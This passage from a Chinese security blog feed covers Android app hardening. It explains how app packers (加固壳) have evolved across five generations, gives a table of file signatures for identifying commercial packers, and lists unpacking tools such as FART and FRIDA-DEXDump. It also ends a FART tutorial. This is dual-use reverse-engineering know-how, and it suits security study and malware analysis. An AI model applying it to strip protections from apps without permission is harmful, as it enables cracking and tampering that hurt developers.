data-caption="image-20231210183725547"><img src="/../images/mobile/fart/image-20231210183725547.png" alt="image-20231210183725547"></a></p><p>然后在该路径下可以看到有bin、txt、dex三种文件。</p><ul><li><p>带有 excute 关键字的 dex 文件是在 excute 脱壳点脱下来的 dex 文件，我们可以直接在 jadx 里面打开这个 dex。关于该脱壳点的更多信息可以看<a href="https://bbs.kanxue.com/thread-254555.htm">《拨云见日：安卓APP脱壳的本质以及如何快速发现ART下的脱壳点》</a>。</p></li><li><p>带有 excute 关键字的 classlist_execute.txt 文件，该文件是 dex 中所有类的类列表，类名是签名形式的以L开头，表示它是一个类，$ 后面是类中的方法。</p></li><li><p>在修复文件的选择上，首先其实只需要看有 bin 函数体文件的，没有 bin 文件的 dex 是处于不同 Classloader 中的 dex，那些是些系统库或者壳本身，不是我们关心的对象。（修复脚本地址：<a href="https://github.com/hanbinglengyue/FART%EF%BC%89">https://github.com/hanbinglengyue/FART）</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fart.py -d xxx.dex -i xxx.bin &gt;&gt; repired.txt</span><br></pre></td></tr></table></figure></div></li><li><p>并不是所有dex都需要修复，有bin的才能修复，当dump出来的方法体是空的时候，并且有bin文件，然后才要去修复，大部分不需要修复，直接dex</p></li></ul><h2 id="六、注意事项"><a href="#六、注意事项" class="headerlink" title="六、注意事项"></a>六、注意事项</h2><h3 id="开启-OEM-锁"><a href="#开启-OEM-锁" class="headerlink" title="开启 OEM 锁"></a>开启 OEM 锁</h3><p>开启 OEM 锁需要魔法网络，在进行代理后，先在浏览器访问一下 google 看是否成功实施魔法，当网络成功魔法后，就可以在开发者选项中开启 OEM 按钮。（有一点需要注意，如果网络无误后仍然开启不了 OEM ，请查看 Pixel 版本支不支持解锁）</p><h3 id="安装-google-usb-驱动"><a href="#安装-google-usb-驱动" class="headerlink" title="安装 google usb 驱动"></a>安装 google usb 驱动</h3><p>这边需要在 fastboot 模式下安装 google usb 驱动，否则 fastboot 无法识别设备导致无法进行解 BL 锁进而无法进行刷机。</p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p>注意若没有解 BL 执行刷机命令则会出现以下报错，提示需要 <code>Please unlock device to enable this command</code>，即需要解除 BL 锁后再进行操作</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170530338.png" data-caption="image-20231210170530338"><img src="/../images/mobile/fart/image-20231210170530338.png" alt="image-20231210170530338"></a></p><h2 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/r0ysue/p/16791596.html</span><br><span class="line">https://blog.csdn.net/nini_boom/article/details/110122880</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷机 </tag>
            
            <tag> 脱壳机 </tag>
            
            <tag> FART </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动安全-Android APP 加固壳原理</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Android%20APP%20%E5%8A%A0%E5%9B%BA%E5%A3%B3%E5%8E%9F%E7%90%86/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Android%20APP%20%E5%8A%A0%E5%9B%BA%E5%A3%B3%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>为了保护应用及代码的安全性，开发者出厂前会针对安卓 APP 进行加固处理，防范潜在风险。一般通过混淆代码、反调试、阻止反编译、保护内存、加密数据和验证签名等手段，其中代码混淆和加固最为常见。</p><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>代码混淆（Code Obfuscation）：通过对应用程序的代码进行混淆，即重命名类、方法、变量等标识符，并添加无效代码或控制流程的改变，来增加逆向工程的难度。常见的代码混淆工具包括 ProGuard 和 DexGuard。</p><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>加壳：通过在 APK 文件的外层添加一层壳或保护层，来保护应用程序的代码和数据。这层壳可以包含各种安全措施和技术，如加密、反调试、防篡改、运行时解密等。它的作用是增加应用程序的安全性，防止逆向工程和破解行为。即使应用程序被反编译，只能看到外层壳的代码，而无法直接访问内部的关键代码和数据，从而提高了应用程序的安全性。</p><hr><h2 id="二、加固壳史"><a href="#二、加固壳史" class="headerlink" title="二、加固壳史"></a>二、加固壳史</h2><h3 id="第一代加固壳"><a href="#第一代加固壳" class="headerlink" title="第一代加固壳"></a>第一代加固壳</h3><h4 id="DEX加密-落地加载"><a href="#DEX加密-落地加载" class="headerlink" title="DEX加密(落地加载)"></a>DEX加密(落地加载)</h4><p>DEX 是 Dalvik Executable 的缩写，是 Android 操作系统中的一种可执行文件格式。它包含了应用的字节码指令，用于在 Dalvik 虚拟机中运行应用，Dalvik虚拟机将每个应用程序的字节码（编译后的.dex文件）转换为Dalvik可执行文件（.dex文件）。DEX 文件可以通过反编译工具被转换为 Java 代码，因此加密和保护 DEX 文件可以有效防止应用被反编译。常见加固手段如下：</p><ul><li><p><strong>Dex 字符串加密</strong></p><p>采用加密算法对 dex 的字符串进行加密处理，反编译后无法直接查看其代码。例：加密前代码为：String a &#x3D; “This is a string!”; 加密后代码：String a &#x3D; StringFog.decrypt(“ABCDEFGHIJKLMN”); 运行时代码：：decrypt: “ABCDEFGHIJKLMN” &#x3D;&gt; “This is a string!”。</p></li><li><p><strong>静态 DEX 文件整体加解密</strong></p><p>dex 文件整体加壳的基本原理是对 classes.dex 这个文件进行整体加密，将加密后得到的文件 存放在 apk 文件的资源文件中，并在App 运行时将加密后的 classes.dex 文件在内存中进行解密，再让 Dalvik 虚拟机动态加载解密后的原始 clases.dex 文件并执行。</p></li><li><p><strong>资源加密</strong></p><p>对 apk 解压后的资源文件进行加密处理，安卓资源文件一般指 res 和 assets 目录下的文件。例：资源加密后程序在读文件或者解压两个过程进行 hook，并对文件内容进行解密，就能达到资源保护的效果。例：将原资源文件 res&#x2F;layout&#x2F;activity_main.xml 命名为res&#x2F;a&#x2F;a.xml。</p></li><li><p><strong>反反编译</strong></p><p>通过添加反调试、反虚拟机等功能来对抗反编译工具。例如：Ptrace 反调试，使用 Ptrace 系统调用来监控调试器的行为，如果检测到调试器存在，则会终止应用的运行、TracePid 值校验反调试，通过校验 TracePid 值来判断是否被调试，如果不匹配则认为被调试。</p></li><li><p><strong>自定义 DexClassLoader</strong></p><p>使用自定义 DexClassLoader 对加密的 DEX 文件进行加载。这样可以在应用运行时动态加载和解密加密后的 DEX 文件。</p></li><li><p><strong>落地加载</strong></p></li></ul><p>​将应用的代码和资源打包成一个单独的文件，对 apk 解压后，文件夹内可看见相关 dex 文件。</p><h4 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h4><ul><li><p>内存 Dump 法</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于是dex整体保护，在内存中映射是整体连续的，通过定位起始地址将 app 完整脱下来。对于完整的 dex，采用暴力搜索 dex035 采用工具：FRIDA-DEXdump  项目地址：https://github.com/hluwa/FRIDA-DEXDump</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="第二代加固壳"><a href="#第二代加固壳" class="headerlink" title="第二代加固壳"></a>第二代加固壳</h3><h4 id="dex抽取与加固"><a href="#dex抽取与加固" class="headerlink" title="dex抽取与加固"></a>dex抽取与加固</h4><p>第二代加壳技术 对 DEX 文件整体进行了保护 , 将其中的 关键代码抽取到外部 , DEX 加载到内存中后 , 不是完整的 DEX 文件 , 即使将整个 DEX 文件 DUMP 下来之后 , 其中的一些被抽取出来的关键代码无法看到 , 也就是 DEX 文件中的关键类或方法是空的。第一代壳主要针对整个 APK 文件进行加密，第二代壳则对 Dex 文件进行整体加固。第二代壳通过将 Dex 代码加密到 native 层即 so 文件（so 文件是指动态链接库文件，它包含了一些可执行的函数和数据，可以被加载到内存中并被应用调用。so的路径在**&#x2F;data&#x2F;data&#x2F;packagename&#x2F;lib**, 或者&#x2F;data&#x2F;app&#x2F;packagename&#x2F;lib 相关目录下。），常见加固手段如下：</p><ul><li><p><strong>Dex动态加载</strong></p><p>DEX文件的加密和部分函数逻辑的抽取到SO文件中。加载器在运行时负责解密和加载DEX文件，并使应用程序能够动态执行其中的代码逻辑。</p></li><li><p><strong>So加密</strong></p><p>针对 so 文件进行加密，so 文件通常包含了敏感的本地代码或函数实现，加密后程序将在运行时对 so 进行解密获取解密数据。</p></li><li><p><strong>Dex method代码抽取到外部(通常企业版)</strong></p><p>将敏感的 Dex Method 代码从 DEX 文件中提取出来，并进行加密和混淆。</p></li><li><p><strong>不落地加载</strong> </p><p>apk 目录下不能看到原始 dex，把加密的 dex 文件加载到内存中，然后解密，从始至终不会以文件形式存在。</p></li><li><p><strong>反调试，防 HOOK</strong></p></li><li><p>检测调试器、反调试技术、内存完整性检测、代码混淆和加密、防HOOK技术、签名校验。</p></li></ul><h4 id="脱壳工具-1"><a href="#脱壳工具-1" class="headerlink" title="脱壳工具"></a>脱壳工具</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dexhunter： https://github.com/zyq8709/DexHunter</span><br><span class="line">elf-dump-fix：https://github.com/maiyao1988/elf-dump-fix</span><br></pre></td></tr></table></figure></div><h3 id="第三代加固壳"><a href="#第三代加固壳" class="headerlink" title="第三代加固壳"></a>第三代加固壳</h3><h4 id="Dex-动态解密与-so-混淆"><a href="#Dex-动态解密与-so-混淆" class="headerlink" title="Dex 动态解密与 so 混淆"></a>Dex 动态解密与 so 混淆</h4><p>第三代壳在第二代壳的基础上继续改进，对抗 dump 内存脱壳。加深对 Dex 的加密。使用DEX动态加解密的应用程序来说，解密的过程是在运行时进行的，这意味着只有在需要执行特定的代码或方法时，相应的DEX部分才会被解密并加载到内存中，所以导致内存是不连续的无法直接 dump 完整的内存。常见加固手段如下：</p><ul><li><p><strong>Dex method代码动态解密</strong></p><p>将敏感的 Dex Method 代码在运行时进行解密加载到内存中，若没有执行到的  Method 代码则不进行解密并不释放到内存中去。</p></li><li><p><strong>So 代码膨胀混淆</strong></p><p>通过增加无效的、冗余的代码和数据，使得应用程序的代码量变得庞大和复杂，从而增加了分析者阅读和理解代码的难度。</p></li></ul><h4 id="脱壳工具-2"><a href="#脱壳工具-2" class="headerlink" title="脱壳工具"></a>脱壳工具</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dex2oat：https://github.com/spriteviki/Dex2oatHunter</span><br></pre></td></tr></table></figure></div><h3 id="第四代加固壳"><a href="#第四代加固壳" class="headerlink" title="第四代加固壳"></a>第四代加固壳</h3><h4 id="VMP-虚拟机保护"><a href="#VMP-虚拟机保护" class="headerlink" title="VMP(虚拟机保护)"></a>VMP(虚拟机保护)</h4><p>虚拟机保护技术。它通过在应用程序中引入自定义的虚拟机，将原始代码转换为虚拟指令，从而隐藏和保护应用程序的逻辑和算法。</p><h4 id="脱壳方法"><a href="#脱壳方法" class="headerlink" title="脱壳方法"></a>脱壳方法</h4><p>暂未探索到自动化工具进行自动化脱壳。</p><h3 id="第五代加固壳"><a href="#第五代加固壳" class="headerlink" title="第五代加固壳"></a>第五代加固壳</h3><h4 id="虚拟机源码保护（LLVM）"><a href="#虚拟机源码保护（LLVM）" class="headerlink" title="虚拟机源码保护（LLVM）"></a>虚拟机源码保护（LLVM）</h4><p>基于第四代方案的第一种方案（Java&#x2F;Kotlin → C&#x2F;C++），采用LLVM编译工具链（同时支持C&#x2F;C++, Swift, Object-C），通过对IR进行指令转换，生成<strong>自定义指令集（IR → VM）</strong>，APP内部隔离出独立的执行环境，将该核心代码放置在此独立的执行环境中运行</p><h4 id="脱壳方法-1"><a href="#脱壳方法-1" class="headerlink" title="脱壳方法"></a>脱壳方法</h4><p>暂未探索到自动化工具进行自动化脱壳。</p><hr><h2 id="三、壳识别"><a href="#三、壳识别" class="headerlink" title="三、壳识别"></a>三、壳识别</h2><h4 id="手机应用一键识别"><a href="#手机应用一键识别" class="headerlink" title="手机应用一键识别"></a>手机应用一键识别</h4><p>MT管理器：<a href="https://mt2.cn/">https://mt2.cn/</a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231207152604122.png" data-caption="image-20231207152604122"><img src="/../images/mobile/reinforce/image-20231207152604122.png" alt="image-20231207152604122"></a></p><h4 id="Windows-客户端"><a href="#Windows-客户端" class="headerlink" title="Windows 客户端"></a>Windows 客户端</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">appmsg4.6.3（左）：https://github.com/sulab999/AppMessenger</span><br><span class="line">ApkScan-PKID（右）：https://pan.baidu.com/s/1rDfsEvqQwhUmep1UBLUwSQ（注意：该工具为2018年版本）</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231207153148309.png" data-caption="image-20231207153148309"><img src="/../images/mobile/reinforce/image-20231207153148309.png" alt="image-20231207153148309"></a></p><h4 id="加固壳特征"><a href="#加固壳特征" class="headerlink" title="加固壳特征"></a>加固壳特征</h4><table><thead><tr><th>厂商</th><th>特征</th><th>Java代码特征</th></tr></thead><tbody><tr><td>360加固</td><td>assets&#x2F;.appkey<br/>assets&#x2F;libjiagu.so<br/>libjiagu_art.so<br/>libjiagu_x86.so<br/>libprotectClass.so<br/>libjgdtc.so<br/>libjgdtc_a64.so<br/>libjgdtc_art.so<br/>libjgdtc_x64.so<br/>libjgdtc_x86.so<br/>libjiagu_a64.so<br/>libjiagu_ls.so<br/>libjiagu_x64.so<br/>libSafeManageService.so<br/>libjiagu_vip_x64.so<br/>libjiagu_vip.so<br/>libX86Bridge.so</td><td>com.stub.StubApp</td></tr><tr><td>假360加固</td><td></td><td>com.qihoo.util.stub2678363137</td></tr><tr><td>APKProtect</td><td>libAPKProtect.so</td><td></td></tr><tr><td>UU安全加固</td><td>assets&#x2F;libuusafe.jar.so<br/>assets&#x2F;libuusafe.so<br/>lib&#x2F;armeabi&#x2F;libuusafeempty.so</td><td></td></tr><tr><td>apktoolplus加固</td><td>assets&#x2F;jiagu_data.bin<br/>assets&#x2F;sign.bin<br/>lib&#x2F;armeabi&#x2F;libapktoolplus_jiagu.so</td><td>com.linchaolong.apktoolplus.jiagu.ProxyApplication</td></tr><tr><td>中国移动加固</td><td>assets&#x2F;mogosec_classes<br/>assets&#x2F;mogosec_data<br/>assets&#x2F;mogosec_dexinfo<br/>assets&#x2F;mogosec_march<br/>ibmogosecurity.so<br/>lib&#x2F;armeabi&#x2F;libcmvmp.so<br/>lib&#x2F;armeabi&#x2F;libmogosec_dex.so<br/>lib&#x2F;armeabi&#x2F;libmogosec_sodecrypt.so<br/>lib&#x2F;armeabi&#x2F;libmogosecurity.so</td><td>com.mogosec.AppMgr</td></tr><tr><td>几维安全</td><td>assets&#x2F;dex.dat<br/>lib&#x2F;armeabi&#x2F;kdpdata.so<br/>lib&#x2F;armeabi&#x2F;libkdp.so<br/>lib&#x2F;armeabi&#x2F;libkwscmm.so<br/>libkwscr.so<br/>libkwslinker.so</td><td>com.Kiwisec.KiwiSecApplication、com.Kiwisec.ProxyApplication</td></tr><tr><td>启明星辰</td><td>libvenSec.so<br/>libvenustech.so</td><td></td></tr><tr><td>网秦加固</td><td>libnqshield.so</td><td></td></tr><tr><td>娜迦加固</td><td>libchaosvmp.so<br/>libddog.so<br/>libfdog.so<br/>libhdog.so</td><td></td></tr><tr><td>娜迦加固（新版2022）</td><td>assets&#x2F;maindata&#x2F;fake_classes.dex<br/>lib&#x2F;armeabi&#x2F;libxloader.so<br/>lib&#x2F;armeabi-v7a&#x2F;libxloader.so<br/>lib&#x2F;arm64-v8a&#x2F;libxloader.so<br/>libxloader.so</td><td></td></tr><tr><td>娜迦加固（开发者试用版-VMP）</td><td>libvdog-x86.so<br/>libvdog.so</td><td></td></tr><tr><td>娜迦加固（企业版）</td><td>libedog.so</td><td></td></tr><tr><td>梆梆安全（企业版）</td><td>libDexHelper-x86.so<br/>libDexHelper.so<br/>libDexHelper-x86_64.so</td><td></td></tr><tr><td>梆梆安全（定制版）</td><td>assets&#x2F;classes.jar<br/> lib&#x2F;armeabi&#x2F;DexHelper.so</td><td></td></tr><tr><td>梆梆安全（免费版）</td><td>assets&#x2F;secData0.jar<br/>lib&#x2F;armeabi&#x2F;libSecShell-x86.so<br/>lib&#x2F;armeabi&#x2F;libSecShell.so<br/>libSecShell_art.so<br/>libSecShel1.so<br/>libsecexe.so<br/>libsecmain.so<br/>libbangcle_crypto_tool.so<br/>libpnc-crypto.so</td><td>com.secneo.apkwrapper.ApplicationWrapper、com.SecShell.SecShell.ApplicationWrapper、com.secneo.apkwrapper.AW</td></tr><tr><td>假梆梆加固</td><td></td><td>com.secoen.apkwrapper.ApplicationWrapper</td></tr><tr><td>海云安加固</td><td>assets&#x2F;itse<br/>lib&#x2F;armeabi&#x2F;libitsec.so<br/>libitsec.so</td><td>c.b.c.b</td></tr><tr><td>爱加密</td><td>assets&#x2F;af.bin<br/>assets&#x2F;ijm_lib&#x2F;X86&#x2F;libexec.so<br/>assets&#x2F;ijm_lib&#x2F;armeabi&#x2F;libexec.so<br/>assets&#x2F;signed.bin<br/>ijiami.dat<br/>lib&#x2F;armeabi&#x2F;libexecmain.so<br/>libexecmain.so<br/>libexecmain_x86.so<br/>libexecoat.so<br/>libexecoat_x86.so<br/>libijm-emulator.so</td><td>s.h.e.l.l.S</td></tr><tr><td>爱加密企业版</td><td>assets&#x2F;ijiami.ajm</td><td></td></tr><tr><td>爱加密3代壳</td><td>assets&#x2F;ijiami3.ajm<br/>libexecv3.so</td><td></td></tr><tr><td>爱加密5代壳</td><td>assets&#x2F;IJMDal.Data<br/>assets&#x2F;libijmDataEncryption.so<br/>libijmDataEncryption_arm64.so<br/>libijmDataEncryption_x86.so<br/>libijmDataEncryption_x86_64.so</td><td></td></tr><tr><td>珊瑚灵御</td><td>assets&#x2F;libreincp.so<br/>assets&#x2F;libreincp_x86.so</td><td>com.coral.util.StubApplication</td></tr><tr><td>瑞星加固</td><td>librsprotect.so</td><td></td></tr><tr><td>百度加固</td><td>libbaiduprotect.so<br/>assets&#x2F;baiduprotect.jar<br/>assets&#x2F;baiduprotect1.jar<br/>lib&#x2F;armeabi&#x2F;libbaiduprotect.so<br/>libbaiduprotect_art.so<br/>libbaiduprotect_x86.so</td><td>com.baidu.protect.StubApplication</td></tr><tr><td>盛大加固</td><td>libapssec.so</td><td></td></tr><tr><td>网易易盾</td><td>libnesec.so</td><td></td></tr><tr><td>腾讯加固</td><td>libexec.so<br/>libshell.so</td><td>com.tencent.StubShell.TxAppEntry</td></tr><tr><td>腾讯乐固（旧版）</td><td>libtup.so<br/>lib&#x2F;armeabi&#x2F;mix.dex<br/>liblegudb.so<br/>libshella<br/>lib&#x2F;armeabi&#x2F;mixz.dex<br/>libshel1x<br/>lib&#x2F;armeabi&#x2F;libshella-xxxx.so<br/>lib&#x2F;armeabi&#x2F;libshellx-xxxx.so<br/>tencent_stub<br/>libshella-2.10.2.3.so<br/>libshell.so<br/>libshella-2.9.0.2<br/>libshella-4.1.0.15.so<br/>libshella-4.1.0.19.so<br/>libshellx.so</td><td>com.tencent.StubShell.TxAppEntry</td></tr><tr><td>腾讯乐固（VMP）</td><td>lib&#x2F;arm64-v8a&#x2F;libxgVipSecurity.so<br/>lib&#x2F;armeabi-v7a&#x2F;libxgVipSecurity.so<br/>libxgVipSecurity.so</td><td></td></tr><tr><td>腾讯云加固</td><td>assets&#x2F;libshellx-super.2021.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2019.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2020.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2021.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2022.so<br/>lib&#x2F;armeabi&#x2F;libshell-super.2023.so<br/>tencent_sub</td><td></td></tr><tr><td>腾讯云移动应用安全</td><td>0000000lllll.dex<br/>00000olllll.dex<br/>000O00ll111l.dex<br/>00O000ll111l.dex<br/>0OO00l111l1l<br/>o0oooOO0ooOo.dat</td><td></td></tr><tr><td>腾讯云移动应用安全（腾讯御安全）</td><td>libBugly-yaq.so<br/>libshell-super.2019.so<br/>libshellx-super.2019.so<br/>libzBugly-yaq.so<br/>t86<br/>tosprotection<br/>tosversion<br/>000000011111.dex<br/>000000111111.dex<br/>000001111111<br/>00000o11111.dex<br/>o0ooo000oo0o.dat</td><td></td></tr><tr><td>腾讯御安全</td><td>libtosprotection.armeabi-v7a.so<br/>libtosprotection.armeabi.so<br/>libtosprotection.x86.so<br/>assets&#x2F;libtosprotection.armeabi-v7a.so<br/>assets&#x2F;libtosprotection.armeabi.so<br/>assets&#x2F;libtosprotection.x86.so<br/>assets&#x2F;tosversion<br/>lib&#x2F;armeabi&#x2F;libTmsdk-xxx-mfr.so<br/>lib&#x2F;armeabi&#x2F;libtest.so</td><td>MyWrapperProxyApplication</td></tr><tr><td>腾讯Bugly</td><td>lib&#x2F;arm64-v8a&#x2F;libBugly.so<br/>libBugly.so</td><td></td></tr><tr><td>蛮犀加固</td><td>assets&#x2F;mxsafe.config<br/>assets&#x2F;mxsafe.data<br/>assets&#x2F;mxsafe.jar<br/>assets&#x2F;mxsafe&#x2F;arm64-v8a&#x2F;libdSafeShell.so<br/>assets&#x2F;mxsafe&#x2F;x86_64&#x2F;libdSafeShell.so<br/>libdSafeShell.so</td><td></td></tr><tr><td>通付盾</td><td>libNSaferOnly.so<br/>libegis.so<br/>libgeiri.so<br/>libgeiri-x86.so</td><td></td></tr><tr><td>阿里加固</td><td>assets&#x2F;armeabi&#x2F;libzuma.so<br/>aliprotect.dat<br/>assets&#x2F;armeabi&#x2F;libfakejni.so<br/>assets&#x2F;libzuma.so<br/>assets&#x2F;libzumadata.so<br/>assets&#x2F;libpreverify1.so<br/>libsgmain.so<br/>libsgsecuritybody.so<br/>libmobisec.so</td><td></td></tr><tr><td>阿里云加固</td><td>libdemolish.so<br/>libdemolishdata.so</td><td></td></tr><tr><td>阿里聚安全</td><td>assets&#x2F;armeabi&#x2F;libfakejni.so<br/>assets&#x2F;libzumadata.so<br/>assets&#x2F;libpreverify1.so<br/>aliprotect.dat<br/>libdemolish.so<br/>libfakejni.so<br/>libmobisec.so<br/>libsgmain.so<br/>assets&#x2F;libzuma.so<br/>libzumadata.so<br/>libdemolishdata.so<br/>libpreverify1.so<br/>libsgsecuritybody.so</td><td></td></tr><tr><td>顶像科技</td><td>libx3g.so<br/>libjni.so<br/>lib&#x2F;armeabi&#x2F;libx3g.so</td><td>cn.securitystack.stee.AppStub</td></tr><tr><td>DexProtect加固</td><td>assets&#x2F;classes.dex.dat<br/>dp.arm-v7.so.dat<br/>dp.arm.so.dat</td><td></td></tr><tr><td>CFCA加固</td><td>libsecenh_a64.so<br/>libsecenh_x86.so<br/>my_classes.jar<br/>libsecenh.so<br/>libbasec.so<br/>libbasec_x86.so</td><td></td></tr><tr><td>OPPO加固-oppo手机加固</td><td>OPPOProtect.so<br/>OPPOProtect2019.so<br/>OPPOProtect2020.so<br/>OPPOProtect2021.so<br/>OPPOProtect2022.so<br/>OPPOProtect2023.so</td><td></td></tr><tr><td>OPPO加固-安全检测SDK</td><td>libomesStdSco.so<br/>jni&#x2F;arm64-v8a&#x2F;libomesStdSco.so<br/>jni&#x2F;armeabi-v7a&#x2F;libomesStdSco.so<br/>jni&#x2F;x86&#x2F;libomesStdSco.so<br/>jni&#x2F;x86_64&#x2F;libomesStdSco.so</td><td></td></tr><tr><td>深盾安全加固（Virbox Protector）</td><td>ibvirbox32.so<br/>libvirbox64.so</td><td></td></tr></tbody></table><h4 id="特征找寻案例"><a href="#特征找寻案例" class="headerlink" title="特征找寻案例"></a>特征找寻案例</h4><p>APP 爱加密5代壳，将 .apk 修改为 .zip 然后进行解压，解压后 assets 发现爱加密5代壳特征，IJMDal.Data</p><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231207155612690.png" data-caption="image-20231207155612690"><img src="/../images/mobile/reinforce/image-20231207155612690.png" alt="image-20231207155612690"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/reinforce/image-20231208100319417.png" data-caption="image-20231208100319417"><img src="/../images/mobile/reinforce/image-20231208100319417.png" alt="image-20231208100319417"></a></p><p>通过查壳工具，亦能查询</p><p>![image-20231207153148309](E:\Security file\learning notes\images\image-20231207153148309-17080968561231.png)</p><hr><h2 id="四、脱壳方法及工具汇总"><a href="#四、脱壳方法及工具汇总" class="headerlink" title="四、脱壳方法及工具汇总"></a>四、脱壳方法及工具汇总</h2><h3 id="内存dump"><a href="#内存dump" class="headerlink" title="内存dump"></a>内存dump</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FRIDA-DEXdump：https://github.com/hluwa/FRIDA-DEXDump</span><br></pre></td></tr></table></figure></div><h3 id="文件监视"><a href="#文件监视" class="headerlink" title="文件监视"></a>文件监视</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inotifywait-for-Android ：https://github.com/dstmath/inotifywait-for-Android</span><br></pre></td></tr></table></figure></div><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDA 资源地址：https://www.52pojie.cn/thread-1861590-1-1.html</span><br></pre></td></tr></table></figure></div><h3 id="内存重组"><a href="#内存重组" class="headerlink" title="内存重组"></a>内存重组</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZjDroid ：https://github.com/halfkiss/ZjDroiddumpDex</span><br><span class="line">dumpDex ：https://github.com/WrBug/dumpDex</span><br><span class="line">elfrebuild ：https://github.com/ylcangel/ElfRebuild</span><br></pre></td></tr></table></figure></div><h3 id="dex2oat"><a href="#dex2oat" class="headerlink" title="dex2oat"></a>dex2oat</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dex2oatHunter ：https://github.com/spriteviki/Dex2oatHunte</span><br></pre></td></tr></table></figure></div><h3 id="定制系统"><a href="#定制系统" class="headerlink" title="定制系统"></a>定制系统</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FART ：https://github.com/hanbinglengyue/FART</span><br><span class="line">BlackDex ：https://github.com/CodingGay/BlackDex</span><br></pre></td></tr></table></figure></div><p>攻击者可以通过自定义Android虚拟机，在解释器的代码上做记录一个函数的内容（CodeItem）。接下来遍历触发所有函数，从而获取到全部的函数内容。最终重新组装成一个完整的DEX文件</p><h3 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xposed：https://github.com/ElderDrivers/EdXposed（非原 Xposed，原Xposed已停止更新）</span><br><span class="line">FRIDA：https://github.com/frida/frida</span><br></pre></td></tr></table></figure></div><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://www.isisy.com/1420.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/550084508</span><br><span class="line">https://github.com/moyuwa/ApkCheckPack/tree/main</span><br><span class="line">https://blog.csdn.net/g5703129/article/details/85054405</span><br><span 